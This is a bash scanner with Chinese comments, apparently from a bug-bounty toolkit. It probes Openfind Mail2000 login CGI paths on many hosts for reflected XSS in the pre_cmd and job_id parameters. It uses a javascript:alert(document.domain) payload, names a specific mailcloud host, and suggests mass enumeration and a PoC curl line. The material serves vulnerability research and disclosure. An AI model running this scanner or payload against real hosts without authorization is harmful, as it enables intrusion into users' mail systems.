#!/usr/bin/env bash
# hunt-mail2000-pre-cmd.sh — Openfind Mail2000 (M2K) CGI pre_cmd/job_id 反射 XSS
# 來源：openfind OF-013（22 主機 Mail2000 pre_cmd XSS 確認）
#       Pattern - Vendor Product Multi-Host Enumeration（KB）
#
# Mail2000 (M2K) 是 Openfind 自家 mail product，全球部署：
#   - 多 tier：vip-* / ms-* / vs-* / cas-* / eas-*
#   - 多 region：tw / jp / sg / cn / sg-aws / us
#   - 多 subpath：/cgi-bin/login（主登入）/ /cgi-bin/mbase/mblogin（mbase）/ cal.* 日曆
#
# 攻擊面：`pre_cmd` 與 `job_id` 兩個 GET 參數**完全無過濾**：
#   - 反射 5 個位置（stInfo JS object / 隱藏 input / locationOpen() sink）
#   - `"` 編碼為 `\x22` 但 `javascript:` 協議完全保留
#   - locationOpen(pre_cmd) → 登入後 window.location = pre_cmd → 任意導向 / XSS
#
# 用法：
#   ./hunt-mail2000-pre-cmd.sh https://vip-chief-web.mailcloud.com.tw
#   for H in $(cat hosts.txt); do ./hunt-mail2000-pre-cmd.sh "$H"; done
#   # 然後彙整：grep -h "VULN" mail2000_out/*.txt
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../configs/tool-profiles.sh" 2>/dev/null || true

URL="${1:-}"
[ -z "$URL" ] && { echo "Usage: $0 <https://host> | for H in \$(cat hosts.txt); do $0 \"\$H\"; done"; exit 1; }
URL="${URL%/}"
OUT_DIR="${OUT_DIR:-./mail2000_out}"
mkdir -p "$OUT_DIR"
SLUG=$(echo "$URL" | sed 's|https\?://||;s|[/:]|_|g')
OUT="$OUT_DIR/${SLUG}.txt"
: > "$OUT"

log() { echo "[$(date +%H:%M:%S)] $*" | tee -a "$OUT"; }
hit() { echo "🔴 VULN $*" | tee -a "$OUT"; }
warn() { echo "🟠 $*" | tee -a "$OUT"; }
info() { echo "   $*" >> "$OUT"; }

# 探測 Mail2000 fingerprint：/cgi-bin/login 是 M2K signature path
LOGIN_PATHS=(
  "/cgi-bin/login"
  "/cgi-bin/mbase/mblogin"
  "/cgi-bin/login?index=1"
)

PAYLOAD_PRE_CMD="javascript:alert(document.domain)"
PAYLOAD_JOB_ID="bbflowXSSTEST$(date +%s)"

log "=== Mail2000 hunt: $URL ==="

VULN_PRE_CMD_CONFIRMED=0
VULN_JOB_ID_CONFIRMED=0
PATHS_HIT=()

for P in "${LOGIN_PATHS[@]}"; do
  TEST_URL="${URL}${P}"
  # 先確認 path 存在
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 "$TEST_URL")
  if [ "$STATUS" != "200" ] && [ "$STATUS" != "302" ]; then
    info "$P → HTTP $STATUS (skip)"
    continue
  fi

  PATHS_HIT+=("$P")
  info "$P → HTTP $STATUS"

  # pre_cmd 反射測試
  SEP="?"
  [[ "$P" == *"?"* ]] && SEP="&"
  PRE_CMD_URL="${TEST_URL}${SEP}pre_cmd=${PAYLOAD_PRE_CMD}"
  PRE_CMD_RESP=$(curl -sk --max-time 8 "$PRE_CMD_URL")
  PRE_CMD_REFL=$(echo "$PRE_CMD_RESP" | grep -c "javascript:alert(document.domain)" || true)
  if [ "$PRE_CMD_REFL" -ge 3 ]; then
    hit "$URL$P pre_cmd 反射 ${PRE_CMD_REFL} 次（M2K CGI XSS 標誌：≥3 反射）"
    VULN_PRE_CMD_CONFIRMED=1

    # 確認 javascript: 協議能繞過 `"` → `\x22` 編碼
    if echo "$PRE_CMD_RESP" | grep -q "javascript:alert"; then
      info "    ✓ javascript: 協議完整保留（XSS sink confirmed）"
    fi
    # 確認 locationOpen sink 存在
    if echo "$PRE_CMD_RESP" | grep -q "locationOpen\|stInfo.pre_cmd"; then
      info "    ✓ locationOpen() / stInfo.pre_cmd sink 命中 → 登入後 redirect 觸發 XSS"
    fi
  elif [ "$PRE_CMD_REFL" -ge 1 ]; then
    warn "$URL$P pre_cmd 反射 $PRE_CMD_REFL 次（< 3，非 M2K 標準 XSS 模式，可能為他 product）"
  fi

  # job_id 反射測試（OF-013 第 2 個反射參數）
  JOB_ID_URL="${TEST_URL}${SEP}job_id=${PAYLOAD_JOB_ID}"
  JOB_ID_RESP=$(curl -sk --max-time 8 "$JOB_ID_URL")
  JOB_ID_REFL=$(echo "$JOB_ID_RESP" | grep -c "$PAYLOAD_JOB_ID" || true)
  if [ "$JOB_ID_REFL" -ge 2 ]; then
    hit "$URL$P job_id 反射 ${JOB_ID_REFL} 次（OF-013 第 2 攻擊參數）"
    VULN_JOB_ID_CONFIRMED=1
  fi
done

# Summary
echo "" >> "$OUT"
echo "── Summary ──" >> "$OUT"
if [ "$VULN_PRE_CMD_CONFIRMED" = "1" ] || [ "$VULN_JOB_ID_CONFIRMED" = "1" ]; then
  hit "Mail2000 CGI XSS CONFIRMED → $URL"
  [ "$VULN_PRE_CMD_CONFIRMED" = "1" ] && info "  pre_cmd vulnerable"
  [ "$VULN_JOB_ID_CONFIRMED" = "1" ] && info "  job_id vulnerable"
  info "  Paths hit: ${PATHS_HIT[*]:-(none)}"
  info ""
  info "  下一步建議："
  info "  1. Multi-host enum：同 mail subdomain 全跑（vip-*/ms-*/vs-*/cas-*/eas-*）+ region matrix（tw/jp/sg/cn/us-aws）"
  info "  2. 報送 1 份 FORM 列舉所有 confirmed hosts（[[Pattern - Vendor Product Multi-Host Enumeration]]）"
  info "  3. PoC 可用 fetch:"
  info "     curl '${URL}/cgi-bin/login?pre_cmd=javascript:alert(document.domain)' | grep stInfo"
else
  echo "🟢 No Mail2000 pre_cmd/job_id reflection found on $URL" | tee -a "$OUT"
  [ ${#PATHS_HIT[@]} -eq 0 ] && info "  No M2K signature paths responded — host probably not Mail2000"
fi

log "=== done → $OUT ==="
